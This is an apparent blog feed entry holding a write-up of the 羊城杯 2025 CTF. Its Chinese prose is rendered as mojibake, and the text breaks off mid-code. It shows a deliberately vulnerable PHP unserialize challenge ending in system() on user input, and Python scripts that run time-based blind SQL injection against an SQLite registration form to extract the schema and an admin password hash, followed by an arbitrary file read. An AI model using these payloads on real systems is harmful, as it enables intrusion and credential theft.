    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.xmcve.com/2025/10/20/%E5%BC%BA%E7%BD%91%E6%9D%AFS9-Polaris%E6%88%98%E9%98%9FWriteup/&quot;&gt;https://blog.xmcve.com/2025/10/20/%E5%BC%BA%E7%BD%91%E6%9D%AFS9-Polaris%E6%88%98%E9%98%9FWriteup/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://wx.zsxq.com/group/824215518412&quot;&gt;https://wx.zsxq.com/group/824215518412&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTFçº¿ä¸Šèµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>ç¾ŠåŸæ¯2025</title>
    <link href="http://c1oudfl0w0.github.io/blog/2025/10/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025/"/>
    <id>http://c1oudfl0w0.github.io/blog/2025/10/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025/</id>
    <published>2025-10-11T06:20:23.000Z</published>
    <updated>2026-01-27T10:13:49.552Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>qwb å‰ç»</p><p>å‚è€ƒï¼š</p><p><a href="https://mp.weixin.qq.com/s/2HVCBFKdr8q7-xyAfJecbA">https://mp.weixin.qq.com/s/2HVCBFKdr8q7-xyAfJecbA</a></p><p><a href="https://www.blog.st4rr.top/writeups/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025%E5%88%9D%E8%B5%9BWriteup.pdf">https://www.blog.st4rr.top/writeups/%E7%BE%8A%E5%9F%8E%E6%9D%AF2025%E5%88%9D%E8%B5%9BWriteup.pdf</a></p><span id="more"></span><hr><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$first</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$step</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$next</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">first</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ç»§ç»­åŠ æ²¹ï¼"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">next</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">E</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$you</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$found</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"admin123"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$name</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"secret"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string double-quoted-string">" maybe is here!&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">found</span><span class="token operator">-></span><span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">F</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$fifth</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$step</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$finalstep</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/U/"</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">finalstep</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ä»”ç»†æƒ³æƒ³ï¼"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">step</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">finalstep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">step</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">H</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$who</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$are</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$you</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">you</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"nobody"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">who</span><span class="token operator">-></span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">N</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$congratulation</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$yougotit</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$func_name</span><span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$func_name</span><span class="token punctuation">,</span><span class="token variable">$args</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">U</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$almost</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$there</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">there</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">N</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">there</span><span class="token operator">-></span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">V</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$good</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$keep</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dowhat</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$go</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$abc</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">dowhat</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">go</span><span class="token operator">-></span><span class="token variable">$abc</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"&lt;br>Win!!!&lt;/br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'payload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é“¾å­ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="ezsignin"><a href="#ezsignin" class="headerlink" title="ezsignin"></a>ezsignin</h2><p>æ³¨å†Œå’Œç™»å½•</p><p>æ³¨æ„åˆ°æ³¨å†Œæ—¶ username ç”¨å•å¼•å·ä¼šè¿”å›æ³¨å†Œå¤±è´¥ï¼Œä¸¤ä¸ªå•å¼•å·åˆ™æ­£å¸¸ï¼Œä¸”åªæœ‰ <code>--</code> èƒ½æ³¨é‡Šï¼Œè¯´æ˜æ˜¯ sqlite</p><p>é‚£ä¹ˆå°±æ˜¯ insert æ³¨å…¥ï¼ŒçŒœæµ‹åç«¯å¤§è‡´å¦‚ä¸‹</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">insert into users(username,password) values(&#39;$&#123;username&#125;&#39;,&#39;$&#123;password&#125;&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨ username å¤„æ³¨å…¥ <code>&#39;,payload)--+</code> å®ç°é—­åˆ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> random<span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token string">"1234567890ABCDEF~"</span>url <span class="token operator">=</span> <span class="token string">'http://45.40.247.139:30959/register'</span>flag <span class="token operator">=</span> <span class="token string">'435245415445205441424'</span>num <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>sample<span class="token punctuation">(</span><span class="token string">'zyxwvutsrqponmlkjihgfedcba'</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"',(case when(substr((select hex(sql) from sqlite_master),&#123;0&#125;,1)='&#123;1&#125;') then randomblob(300000000) else 0 end))--+"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span>i<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"confirmPassword"</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">&#125;</span>        start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        end_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        spend_time <span class="token operator">=</span> end_time <span class="token operator">-</span> start_time        <span class="token comment"># print(spend_time,i)</span>        <span class="token keyword">if</span> spend_time <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> i            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            num <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">"~"</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token string">"over"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çˆ†å‡ºæ¥çš„åˆ›å»ºè¡¨è¯­å¥ä¸º</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">CREATE TABLE users (    id INTEGER PRIMARY KEY AUTOINCREMENT,    username TEXT UNIQUE NOT NULL,    password TEXT NOT NULL,    is_admin BOOLEAN DEFAULT 0,    created_at DATETIME DEFAULT CURRENT_TIMESTAMP);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åçˆ†å¯¹åº”çš„ usernameï¼Œis_admin åˆ—</p><pre class="line-numbers language-sqlite" data-language="sqlite"><code class="language-sqlite">&#39;,(case when(substr((select hex(group_concat(username)) from users),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39;) then randomblob(300000000) else 0 end))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯çŸ¥  <code>Admin</code> æ˜¯ç®¡ç†å‘˜</p><p>ä¸èƒ½ç”¨ group_concat çˆ† password ï¼Œå› ä¸ºæˆ‘ä»¬æ­£åœ¨å†™å…¥é•¿ password ï¼Œè¿™æ ·ä¼šæ— é™é€’å½’å¯¼è‡´é¶æœºç›´æ¥ 502ï¼Œç›´æ¥è¯»ç¬¬ä¸€è¡Œå°±è¡Œ</p><p>æœ€ç»ˆè¯»å‡ºæ¥çš„å¯†ç æ˜¯ <code>98e32d889927abe4014282166e89a323</code>ï¼Œæ­¤å¤„éœ€è¦é€æ­¥çˆ†ç ´æ¯”è¾ƒç¨³å®š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> random<span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token string">"1234567890ABCDEF~"</span>url <span class="token operator">=</span> <span class="token string">'http://45.40.247.139:19815/register'</span>flag <span class="token operator">=</span> <span class="token string">'3938653332643838393932376162'</span>num <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>        <span class="token comment"># payload = ''.join(random.sample('zyxwvutsrqponmlkjihgfedcba',6)) + "',(case when(substr((select hex(sql) from sqlite_master),&#123;0&#125;,1)='&#123;1&#125;') then randomblob(300000000) else 0 end))--+".format(num,i)</span>        payload <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>sample<span class="token punctuation">(</span><span class="token string">'zyxwvutsrqponmlkjihgfedcba'</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"',(case when(substr((select hex(password) from users),1,&#123;0&#125;)='&#123;1&#125;') then randomblob(300000000) else 0 end))--+"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span>flag<span class="token operator">+</span>i<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"confirmPassword"</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">&#125;</span>        start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        end_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        spend_time <span class="token operator">=</span> end_time <span class="token operator">-</span> start_time        <span class="token comment"># print(spend_time,i)</span>        <span class="token keyword">if</span> spend_time <span class="token operator">>=</span> <span class="token number">2</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> i            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            num <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">"~"</span><span class="token punctuation">:</span>        exit<span class="token punctuation">(</span><span class="token string">"over"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç™»è¿›å»å‘ç°ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»ï¼Œå…ˆè¯» ..&#x2F;app.js</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> session <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-session'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> sqlite3 <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'sqlite3'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">verbose</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> db <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">sqlite3<span class="token punctuation">.</span>Database</span><span class="token punctuation">(</span><span class="token string">'./db.sqlite'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*FLAG in /fla4444444aaaaaagg.txt*/</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>  <span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">secret</span><span class="token operator">:</span> <span class="token string">'welcometoycb2025'</span><span class="token punctuation">,</span>    <span class="token literal-property property">resave</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>    <span class="token literal-property property">saveUninitialized</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token literal-property property">cookie</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">secure</span><span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'views'</span><span class="token punctuation">,</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'views'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">checkPermission</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>path <span class="token operator">===</span> <span class="token string">'/login'</span> <span class="token operator">||</span> req<span class="token punctuation">.</span>path <span class="token operator">===</span> <span class="token string">'/register'</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">)</span> <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>isAdmin<span class="token punctuation">)</span> <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'æ— æƒé™è®¿é—®'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>checkPermission<span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  fs<span class="token punctuation">.</span><span class="token function">readdir</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'documents'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> files</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'è¯»å–ç›®å½•æ—¶å‘ç”Ÿé”™è¯¯:'</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'ç›®å½•è¯»å–å¤±è´¥'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>files <span class="token operator">=</span> files<span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'files'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> files<span class="token punctuation">,</span> <span class="token literal-property property">user</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  